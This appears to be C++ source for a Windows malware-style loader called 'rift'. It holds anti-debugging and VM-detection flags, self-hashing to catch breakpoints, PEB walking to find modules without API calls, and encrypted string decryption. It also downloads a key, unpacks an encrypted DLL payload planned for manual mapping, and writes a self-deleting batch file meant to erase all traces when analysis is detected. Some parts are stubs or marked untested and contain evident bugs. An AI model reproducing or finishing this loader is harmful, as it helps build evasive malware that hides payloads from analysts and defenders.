/*--------------------------------*\
 | ! IMPORTANT ! :                |
 | TLS-Callback inside antire.cpp |
\*--------------------------------*/

#include "_riftldr.h"

// Finalize this
struct TlsCallbackInterface {
	enum vm : dword {
		VM_WARE = 1,
		VIRTUAL_BOX,
		VIRTUAL_PC
	} vm : 2;
	enum dbg : dword {
		PEB_BEINGDEBUGGED_FLAG = 1,
		NTQPI_DEBUG_FLAGE,
		NTQPI_DEBUG_OBJECT,
		EXCEPTION_INT2D,
		EXCEPTION_HANDLE,
		EXCEPTION_UNHANDLED,
	} dbg : 3;
};


// Global Process Information Block
PIB* g_PIB;

// Tempoerery test fucntion
status IHashMappedSection2(
	_Out_ cry::Md5::hash& md5
) {
	// Raw Image
	size_t nFile;
	void* pfile = utl::AllocReadFileW(g_PIB->sMod.szMFN, &nFile);
	PIMAGE_NT_HEADERS pNthR = (PIMAGE_NT_HEADERS)((ptr)pfile + ((PIMAGE_DOS_HEADER)pfile)->e_lfanew);
	if (pNthR->Signature != IMAGE_NT_SIGNATURE)
		return -1;
	if (pNthR->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
		return -2;

	// executive image
	HMODULE hMod = GetModuleHandleW(nullptr);
	PIMAGE_NT_HEADERS pNth = (PIMAGE_NT_HEADERS)((ptr)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);
	if (pNth->Signature != IMAGE_NT_SIGNATURE)
		return -3;
	if (pNth->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
		return -4;

	// Calculate reloc delta
	int nRelocDelta = pNth->OptionalHeader.ImageBase - 0x400000;

	// Prepare Hashing
	BCRYPT_ALG_HANDLE ah;
	status s = BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, NULL, NULL);
	BCRYPT_HASH_HANDLE hh;
	s = BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);

	// Iterate over Sections
	PIMAGE_SECTION_HEADER pSh = IMAGE_FIRST_SECTION(pNth);
	for (char i = 0; i < pNth->FileHeader.NumberOfSections; i++) {
		// Skip if Section is not code_seg or const_seg
		if (!(pSh->Characteristics & IMAGE_SCN_CNT_CODE || pSh->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA))
			continue;

		// Make copy of mapped Section
		void* pImageCopy = VirtualAlloc(nullptr, pSh->Misc.VirtualSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		memcpy(pImageCopy, (void*)(pSh->VirtualAddress + pNth->OptionalHeader.ImageBase), pSh->Misc.VirtualSize);
		// Calculate the difference between the section base of the mapped and copied version
		int nBaseDelta = (ptr)pImageCopy - (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase);

		if (nRelocDelta) {
			PIMAGE_BASE_RELOCATION pBrC = (PIMAGE_BASE_RELOCATION)(pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pNth->OptionalHeader.ImageBase);
			while ((ptr)pBrC < ((pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pNth->OptionalHeader.ImageBase)
				+ pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
			) {
				if ((ptr)pBrC >= pSh->VirtualAddress && (ptr)pBrC <= pSh->VirtualAddress + pSh->Misc.VirtualSize) {
					// First Relocation Entry
					struct IMAGE_RELOCATION_ENTRY {
						word Offset : 12;
						word Type : 4;
					} *pRe = (IMAGE_RELOCATION_ENTRY*)(pBrC + 1);

					// iterate over Relocation Entries and apply changes
					for (word i = 0; i < (pBrC->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY); i++)
						switch (pRe[i].Type) {
						case IMAGE_REL_BASED_HIGHLOW:
							*(ptr*)(((pBrC->VirtualAddress + pNth->OptionalHeader.ImageBase) + pRe[i].Offset) + nBaseDelta) -= nRelocDelta;
							break;
						case IMAGE_REL_BASED_ABSOLUTE:
							continue;
						default:
							VirtualFree(pImageCopy, 0, MEM_RELEASE);
							return -3;
						}

					// this would probably be enough, but just to make sure we are on a 32bit boundary
					// note: after testing i found out that this is enough, as SizeOfBlock includes the paded Entry
					*(ptr*)&pBrC += pBrC->SizeOfBlock;
				}
			}
		}

		// So this is quiet shitty for debugging, basically i just realized that the debugger works by replacing instructions
		// with int3 interrupts (0xcc), so this basically fucks up the calculations if run under a debugger.
		// (as a nice sideeffect this might also catch a debugger if it places breakpoints)

		// Special Handling (make a list of pointers and sizes that will be ignored by checking if they are in the region)
		// (dont do it through section names (maybe use them es additional checks (probably not tho (has no actuall gains))))
		static const struct ignore {
			ptr VirtualAddress;
			size_t RegionSize;
		} list[] = {
			{ 0,  4 },
			{ 3412, 8 },
			{ 312, 32 }
		};
#if 0 // Old version/idea
		void* ptr = (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + nBaseDelta;
		for (uint8 j = 0; j < sizeof(list) / sizeof(*list); j++)
			if ((list[i].VirtualAddress >= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase)
				&& (list[i].VirtualAddress + list[i].RegionSize <= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase)
				) {
				ptr dif = ptr - ((pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + nBaseDelta)
					s = BCryptHashData(hh, (uchar*)(ptr), dif, NULL);
				ptr = dif + list[i].RegionSize;
			}
			else {
				s = BCryptHashData(hh, (uchar*)(ptr), pSh->Misc.VirtualSize, NULL);
			}
#else	// NOTE: This ignorelist code is still untested
		// Generate section ordered ignorelist
		ignore* ilist = nullptr;
		size_t nlist = 0;

		uint8 lastsmallestindex = 0;
		for (uint8 j = 0; j < sizeof(list) / sizeof(*list); j++) {
			uint8 smallestindex = -1;
			for (uint8 n = 0; n < sizeof(list) / sizeof(*list); n++) {
				if ((list[i].VirtualAddress >= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase)
					&& (list[i].VirtualAddress + list[i].RegionSize <= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase)
					) {
					if (n < smallestindex && n > lastsmallestindex)
						smallestindex = n;
				}
			}

			// probably not enough checks
			if (smallestindex > lastsmallestindex) {
				if (ilist)
					ilist = (ignore*)realloc(ilist, ++nlist * sizeof(ignore));
				else
					ilist = (ignore*)malloc(++nlist * sizeof(ignore));

				ilist[nlist - 1] = list[smallestindex];
			}
		}

		// Iterate through ignorelist and hash
		ptr ptrbase = (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + nBaseDelta;
		if (nlist) {
			for (uint8 j = 0; j < nlist; j++) {
				ptr dif = ptrbase - ((pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + nBaseDelta);
				s = BCryptHashData(hh, (uchar*)(ptrbase), dif, NULL);
				ptrbase = dif + ilist[i].RegionSize;
			}
		} else {
			s = BCryptHashData(hh, (uchar*)(ptrbase), pSh->Misc.VirtualSize, NULL);
		}

		if (ilist)
			free(ilist);
#endif

		// TODO: just hashing the sections here
		VirtualFree(pImageCopy, 0, MEM_RELEASE);
		pSh++;
	}

	BCryptFinishHash(hh, (uchar*)&md5, sizeof(md5), NULL);
	BCryptDestroyHash(hh);
	BCryptCloseAlgorithmProvider(ah, NULL);
	return 0;
}

HANDLE GetModuleThroughPebX86(
	_In_ const wchar* szMod
) {
	void* pPeb = (void*)__readfsdword(0x30);
	void* pPebLdrData = (void*)((ptr)pPeb + 0xc);
	LIST_ENTRY* leModList = (LIST_ENTRY*)((ptr)pPebLdrData + 0x14);

	while (leModList->Flink != leModList) {
		void* pLdrData = (void*)((ptr)leModList + sizeof(*leModList));
		void* usDllBaseName = (void*)((ptr)pLdrData + 0x2c);
		if (!memcmp((wchar*)((ptr)usDllBaseName + 0x4), szMod, *(ushort*)usDllBaseName))
			return (HANDLE)((ptr)pLdrData + 0x18);
	}

	return NULL;
}

int WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     int       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	{	// Initialize Process Information Block
		g_PIB = (PIB*)malloc(sizeof(PIB));
		g_PIB->sMod.hM = hInstance;
		GetCurrentDirectoryW(MAX_PATH, g_PIB->sMod.szCD);
		GetModuleFileNameW(hInstance, g_PIB->sMod.szMFN, MAX_PATH);
		utl::IGenerateHardwareId(&g_PIB->sID.HW);
		utl::IGenerateSessionId(&g_PIB->sID.SE);
		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, (int*)&g_PIB->sArg.n);
	}

	// IHashMappedSection2();

	BOOL IOpenConsole();
	IOpenConsole();

	// WCHAR UUid[UUID_STRLEN + 1];
	// EUidToStringW(&g_PIB->sID.HW, UUid, UUID_STRLEN);

	if (g_PIB->sArg.n > 0) {
		if (!lstrcmpW(g_PIB->sArg.v[0], L"/i")) { // Start Installation

		} else if (!lstrcmpW(g_PIB->sArg.v[0], L"/s")) { // Start Servicemode

		}
	} else { // Userstart

	}

	// Create Random Mutex using SeId
#if 0
	size_t nResult;
	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
	PWSTR szMutex = malloc(MAX_PATH * sizeof(WCHAR));
	StringCchCopyW(szMutex, MAX_PATH, szLocal);
	free((void*)szLocal);
	void* pHWID = malloc(sizeof(hash));
	CopyMemory(pHWID, &g_PIB->sID.SE, sizeof(hash));
	PCWSTR szRandom = EAllocRandomBase64StringW((dword*)pHWID, MAX_PATH / 2, MAX_PATH - 7);
	free(pHWID);
	StringCchCatW(szMutex, MAX_PATH, szRandom);
	free((void*)szRandom);
	// CreateMutexW(0, FALSE, szMutex);
#endif

	// init console here
	// check vm here

	{
		if (InternetAttemptConnect(NULL)) {
			// EPrintFW(L"Couldn't connect to Internet-Services.\nSoftware blocks further execution!\n", CON_WARNING);
			status s = ReadConsoleW(GetStdHandle(STD_INPUT_HANDLE), nullptr, 1, nullptr, nullptr);
			return -1;
		}
	}

	void* pWKey = utl::IDownloadKey();
	if (!pWKey) {
		PWSTR szKeyBlob = (PWSTR)malloc(MAX_PATH);
		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->sMod.szCD, L"RIFTWKEY"); // Temporery
		dword nKeyBlob;
		pWKey = utl::AllocReadFileW(szKeyBlob, (size_t*)&nKeyBlob);
	} if (pWKey)
		g_PIB->sCry.EK = new cry::Aes(pWKey);
	else
		return 0x45e0;

	size_t nDll;
	void* pDll = cry::EUnpackResource(IDR_RIFTDLL, &nDll);
	if (!pDll)
		return 0x132d;

#ifndef _DEBUG
	// Implement Manual Mapping using BlackBone
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2ab5;


	void* DllMain = GetProcAddress(dhDll, "DllMain");
	status bTest = ((status(WINAPI*)(_In_ HINSTANCE hinstDLL, _In_ dword fdwReason, _In_ void* pvReserved))DllMain)(NULL, 4, g_PIB);

	FreeLibrary(dhDll);
#endif
	SecureZeroMemory(pDll, nDll);
	free(pDll);

	{	// CleanUp
		rng::Xoshiro::Instance()->~Xoshiro();
		LocalFree(g_PIB->sArg.v);
		free(g_PIB);
	} return 0;
}

/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered (/called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
const static WCHAR l_szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID ESelfDestruct() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	PCWSTR szRandom = rng::EAllocRandomPathW(NULL, 8, 16);
	CopyMemory(szFilePath, g_PIB->sMod.szCD, MAX_PATH * sizeof(WCHAR));
	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");

	// Prepare Script content
	wchar* pScriptW = (wchar*)malloc(0x800);
	uint32 uiRandomID = rng::Xoshiro::Instance()->EXoshiroSS();
	PCWSTR szMFN = utl::GetFileNameFromPathW(g_PIB->sMod.szMFN);
	swprintf(pScriptW, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, utl::GetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	size_t nScript = wcslen(pScriptW);
	PSTR pScriptA = (PSTR)malloc(0x400);
	WideCharToMultiByte(CP_ACP, NULL, (PWSTR)pScriptW, -1, pScriptA, 0x400, NULL, NULL);
	free(pScriptW);

	// Write to Disk
	utl::WriteFileCW(szFilePath, pScriptA, nScript);
	free(pScriptA);
}